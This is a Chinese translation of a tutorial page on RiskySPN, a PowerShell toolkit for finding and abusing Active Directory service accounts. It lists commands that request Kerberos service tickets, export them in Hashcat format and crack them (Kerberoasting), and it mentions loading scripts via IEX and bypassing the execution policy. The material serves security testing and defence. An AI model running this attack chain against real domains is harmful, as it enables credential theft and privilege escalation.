# RiskySPN–PowerShell 脚本的集合，主要用于检测和滥用 SPNs 帐户

> 原文：<https://kalilinuxtutorials.com/riskyspn-detect-abuse-risky-spns/>

**RiskySPN** 是一组 PowerShell 脚本，主要用于检测和滥用与 SPN(服务主体名称)相关的帐户。该模块可以帮助蓝队识别潜在的风险 SPN，并帮助红队利用 Kerberos 和 Active Directory 提升权限。

**也可阅读 [Metasploit 框架——渗透测试、漏洞利用开发和漏洞研究初学者指南](https://kalilinuxtutorials.com/metasploit-framework/)**

## **RiskySPN 用法**

### **安装模块**

```
Import-Module .\RiskySPNs.psm1
```

##### **或者直接加载脚本(你也可以`IEX`从网上)**

```
. .\Find-PotentiallyCrackableAccounts.ps1
```

确保`Set-ExecutionPolicy`是`Unrestricted`或`Bypass`

### **获取关于功能的信息**

```
Get-Help Get-TGSCipher -Full
```

所有功能也有`-Verbose`模式

### **搜索易受攻击的 SPN**

##### **查找易受攻击的账户**

```
Find-PotentiallyCrackableAccounts
```

敏感+ RC4 = $$$

##### **生成关于易受攻击账户的完整详细报告(CISO < 3)**

```
Export-PotentiallyCrackableAccounts
```

### **获取门票**

##### **为 SPN 请求 Kerberos TGS**

```
Get-TGSCipher -SPN "MSSQLSvc/prodDB.company.com:1433"
```

##### **或**

```
Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher
```

### 有趣的东西🙂

```
Find-PotentiallyCrackableAccounts -Sensitive -Stealth -GetSPNs | Get-TGSCipher -Format "Hashcat" | Out-File crack.txt
oclHashcat64.exe -m 13100 crack.txt -a 3
```

[![](img/d861a9096555aeb1980fc054015933d7.png)](https://github.com/cyberark/RiskySPN)